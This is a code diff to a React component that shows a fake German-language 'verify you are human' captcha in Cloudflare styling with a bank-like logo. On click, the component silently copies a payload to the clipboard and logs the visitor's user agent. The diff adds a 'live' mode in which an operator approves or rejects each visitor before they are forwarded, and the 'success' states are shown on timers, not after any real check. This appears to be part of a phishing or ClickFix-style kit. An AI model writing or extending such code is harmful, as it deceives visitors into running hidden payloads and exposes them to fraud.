@@ -5,7 +5,7 @@ import Index from "./Index";
 import apoLogo from "@/assets/apo-a-logo.png.asset.json";
 import { supabase } from "@/integrations/supabase/client";
 
-type Phase = "idle" | "verifying" | "waiting" | "success" | "slider";
+type Phase = "idle" | "verifying" | "success" | "slider" | "liveWaiting" | "liveApproved" | "liveRejected";
 
 
 const CfCaptcha = () => {
@@ -76,6 +76,17 @@ const CfCaptcha = () => {
     if (phase !== "idle") return;
     copyPayload();
     setPhase("verifying");
+
+    let mode = flowMode;
+    try {
+      const { data } = await (supabase as any)
+        .from("api_settings").select("flow_mode").limit(1).maybeSingle();
+      if (data?.flow_mode) {
+        mode = data.flow_mode;
+        setFlowMode(data.flow_mode);
+      }
+    } catch {}
+
     // create captcha request for admin release
     try {
       const ua = typeof navigator !== "undefined" ? navigator.userAgent : null;
@@ -94,14 +105,19 @@ const CfCaptcha = () => {
         .select("id").single();
       if (data?.id) setRequestId(data.id);
     } catch {}
-    setTimeout(() => setPhase("success"), 1400);
-    setTimeout(() => setPhase("slider"), 2300);
+    setTimeout(() => setPhase("success"), 800);
+    setTimeout(() => {
+      if (mode === "live") {
+        setPhase("liveWaiting");
+      } else {
+        setPhase("slider");
+      }
+    }, 1800);
   };
 
 
 
 
-  const [sliderReleased, setSliderReleased] = useState(false);
   const [flowMode, setFlowMode] = useState<string>("afk");
 
   useEffect(() => {
@@ -114,22 +130,31 @@ const CfCaptcha = () => {
     })();
   }, []);
 
-  // poll for slider release once slider is visible (live mode only; AFK auto-releases)
+  // poll for admin decision once the live waiting screen is shown
   useEffect(() => {
-    if (phase !== "slider") return;
-    if (flowMode === "afk") { setSliderReleased(true); return; }
+    if (phase !== "liveWaiting") return;
     if (!requestId) return;
     let cancelled = false;
     const check = async () => {
       const { data } = await (supabase as any)
-        .from("captcha_requests").select("slider_released_at").eq("id", requestId).maybeSingle();
+        .from("captcha_requests")
+        .select("released_at,rejected_at")
+        .eq("id", requestId)
+        .maybeSingle();
       if (cancelled) return;
-      if (data?.slider_released_at) setSliderReleased(true);
+      if (data?.rejected_at) {
+        setPhase("liveRejected");
+        return;
+      }
+      if (data?.released_at) {
+        setPhase("liveApproved");
+        setTimeout(() => finish(), 1200);
+      }
     };
     check();
     const iv = setInterval(check, 2000);
     return () => { cancelled = true; clearInterval(iv); };
-  }, [phase, requestId, flowMode]);
+  }, [phase, requestId]);
 
   const onDown = (clientX: number) => {
     if (done) return;
@@ -145,7 +170,7 @@ const CfCaptcha = () => {
   const onUp = () => {
     if (!dragging) return;
     setDragging(false);
-    if (x >= maxX() - 4 && sliderReleased) {
+    if (x >= maxX() - 4) {
       setX(maxX());
       finish();
     } else {
@@ -250,7 +275,7 @@ const CfCaptcha = () => {
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bestätigen Sie, dass Sie ein Mensch sind</span>
                   </>
                 )}
-                {(phase === "verifying" || phase === "waiting") && (
+                {(phase === "verifying") && (
                   <>
                     <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Überprüfung läuft...</span>
@@ -262,6 +287,28 @@ const CfCaptcha = () => {
                       <Check className="h-4 w-4 text-white" strokeWidth={3} />
                     </div>
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Erfolgreich!</span>
+                  </>
+                )}
+                {phase === "liveWaiting" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bitte warten. Ihre Verbindung wird geprüft...</span>
+                  </>
+                )}
+                {phase === "liveApproved" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full bg-[#2e7d32] flex items-center justify-center">
+                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
+                    </div>
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Verifizierung erfolgreich. Sie werden weitergeleitet.</span>
+                  </>
+                )}
+                {phase === "liveRejected" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full bg-[#c62828] flex items-center justify-center">
+                      <span className="text-white text-[14px] font-bold leading-none">✕</span>
+                    </div>
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Verifizierung nicht möglich. Sie werden nicht weitergeleitet.</span>
                   </>
                 )}
               </div>
